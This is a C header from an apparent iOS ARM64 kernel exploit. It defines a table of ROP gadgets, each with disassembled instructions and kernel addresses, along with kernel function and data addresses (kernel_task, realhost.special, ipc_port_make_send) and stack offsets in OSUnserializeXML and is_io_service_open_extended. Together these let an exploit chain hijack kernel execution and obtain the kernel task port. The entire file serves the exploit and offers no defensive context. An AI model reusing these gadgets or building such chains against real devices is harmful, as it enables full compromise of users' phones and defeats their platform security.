#ifndef OFFSETS_H
#define OFFSETS_H

#include <stdbool.h>            // bool

#include "common.h"             // addr_t

#ifdef __LP64__
    extern bool dump_full_kernel;
#endif

extern addr_t kernel_base;

/* Hardcoded */

bool use_new_payload(void);

addr_t off_anchor(void);

addr_t off_vtab(void);

/* Dynamic */

void off_cfg(const char *dir);

void off_init(const char *dir);

typedef struct __attribute__ ((__packed__))
{
    struct __attribute__ ((__packed__))
    {
/*****************************************************/
/* Gadgets - do something and load a new stack frame */
/*****************************************************/

        // The _load_xA_xB at the end of the names mean "from A to B".
        // I.e. _load_x24_x19 means to load x24, x23, x22, x21, x20 and x19.

        // 0xffffff800402b69c      fd7b41a9  ldp x29, x30, [sp, 0x10]
        // 0xffffff800402b6a0      f44fc2a8  ldp x20, x19, [sp], 0x20
        // 0xffffff800402b6a4      c0035fd6  ret
        addr_t gadget_load_x20_x19;

        // 0xffffff8005aea01c      3d79c1a8  ldp x29, x30, [x9], 0x10
        // 0xffffff8005aea020      ff430091  add sp, sp, 0x10
        // 0xffffff8005aea024      c0035fd6  ret
        addr_t gadget_ldp_x9_add_sp_sp_0x10;

        // 0xffffff80040e3d1c      e01340f9  ldr x0, [sp, 0x20]
        // 0xffffff80040e3d20      bf8300d1  sub sp, x29, 0x20
        // 0xffffff80040e3d24      fd7b42a9  ldp x29, x30, [sp, 0x20]
        // 0xffffff80040e3d28      f44f41a9  ldp x20, x19, [sp, 0x10]
        // 0xffffff80040e3d2c      f657c3a8  ldp x22, x21, [sp], 0x30
        // 0xffffff80040e3d30      c0035fd6  ret
        addr_t gadget_ldr_x0_sp_0x20_load_x22_x19;

        // 0xffffff80040ddbcc      0000138b  add x0, x0, x19
        // 0xffffff80040ddbd0      fd7b41a9  ldp x29, x30, [sp, 0x10]
        // 0xffffff80040ddbd4      f44fc2a8  ldp x20, x19, [sp], 0x20
        // 0xffffff80040ddbd8      c0035fd6  ret
        addr_t gadget_add_x0_x0_x19_load_x20_x19;

        // 0xffffff8004e5eb60      80023fd6  blr x20
        // 0xffffff8004e5eb64      bf8300d1  sub sp, x29, 0x20
        // 0xffffff8004e5eb68      fd7b42a9  ldp x29, x30, [sp, 0x20]
        // 0xffffff8004e5eb6c      f44f41a9  ldp x20, x19, [sp, 0x10]
        // 0xffffff8004e5eb70      f657c3a8  ldp x22, x21, [sp], 0x30
        // 0xffffff8004e5eb74      c0035fd6  ret
        addr_t gadget_blr_x20_load_x22_x19;

        // 0xffffff800402b698      600200f9  str x0, [x19]
        // 0xffffff800402b69c      fd7b41a9  ldp x29, x30, [sp, 0x10]
        // 0xffffff800402b6a0      f44fc2a8  ldp x20, x19, [sp], 0x20
        // 0xffffff800402b6a4      c0035fd6  ret
        addr_t gadget_str_x0_x19_load_x20_x19;

        // 0xffffff80042fbfbc      a00240f9  ldr x0, [x21]
        // 0xffffff80042fbfc0      fd7b43a9  ldp x29, x30, [sp, 0x30]
        // 0xffffff80042fbfc4      f44f42a9  ldp x20, x19, [sp, 0x20]
        // 0xffffff80042fbfc8      f65741a9  ldp x22, x21, [sp, 0x10]
        // 0xffffff80042fbfcc      f85fc4a8  ldp x24, x23, [sp], 0x40
        // 0xffffff80042fbfd0      c0035fd6  ret
        addr_t gadget_ldr_x0_x21_load_x24_x19;

        addr_t gadget_OSUnserializeXML_return;

/***************************************/
/* Fragments - do something and branch */
/***************************************/

        // 0xffffff800402d978      e10314aa  mov x1, x20
        // 0xffffff800402d97c      60023fd6  blr x19
        addr_t frag_mov_x1_x20_blr_x19;

/*************************************************************/
/* Functions - do something without changing the stack frame */
/*************************************************************/

        // 0xffffff8004119534      000040f9  ldr x0, [x0]
        // 0xffffff8004119538      c0035fd6  ret
        addr_t func_ldr_x0_x0;

        // 0xffffff8004052e0c      88d038d5  mrs x8, tpidr_el1
        // 0xffffff8004052e10      008941f9  ldr x0, [x8, 0x310]
        // 0xffffff8004052e14      c0035fd6  ret
        addr_t func_current_task;

        // task_for_pid:
        // ...
        // 0xffffff80043c31ac      d6bcf197       bl sym._convert_task_to_port
        // 0xffffff80043c31b0      88d038d5       mrs x8, tpidr_el1
        // 0xffffff80043c31b4      088941f9       ldr x8, [x8, 0x310] ; [0x310:4]=0x530018
        // 0xffffff80043c31b8      015141f9       ldr x1, [x8, 0x2a0] ; [0x2a0:4]=0x41445f5f ;
        // 0xffffff80043c31bc      a372f197       bl sym._ipc_port_copyout_send
        // ...
        addr_t func_ipc_port_copyout_send;

        // convert_task_to_port:
        // ...
        // 0xffffff8004032520      d6190394       bl sym._lck_mtx_lock
        // 0xffffff8004032524      607640f9       ldr x0, [x19, 0xe8] ; [0xe8:4]=0x486940 ; "@iH"
        // 0xffffff8004032528      800000b4       cbz x0, 0xffffff8004032538
        // 0xffffff800403252c      9cb5ff97       bl sym._ipc_port_make_send
        // 0xffffff8004032530      f50300aa       mov x21, x0
        // 0xffffff8004032534      02000014       b 0xffffff800403253c
        // 0xffffff8004032538      150080d2       movz x21, 0
        // 0xffffff800403253c      e00314aa       mov x0, x20
        // 0xffffff8004032540      f9190394       bl sym._lck_mtx_unlock
        // 0xffffff8004032544      e00313aa       mov x0, x19
        // 0xffffff8004032548      03730094       bl sym._task_deallocate
        // ...
        addr_t func_ipc_port_make_send;

/*******************/
/* Data structures */
/*******************/

        // kernel_task
        addr_t data_kernel_task;

        // realhost.special
        addr_t data_realhost_special;

    } slid;

    struct __attribute__ ((__packed__))
    {
/**********************************/
/* Offsets within data structures */
/**********************************/

        // &task->itk_self
        addr_t off_task_itk_self;

        // &task->itk_space
        addr_t off_task_itk_space;

        // Size of OSUnserializeXML's stack, including saved registers
        addr_t OSUnserializeXML_stack;

        // Size of is_io_service_open_extended's stack, including saved registers
        addr_t is_io_service_open_extended_stack;

    } unslid;

} offsets_t;

extern offsets_t offsets;

#endif
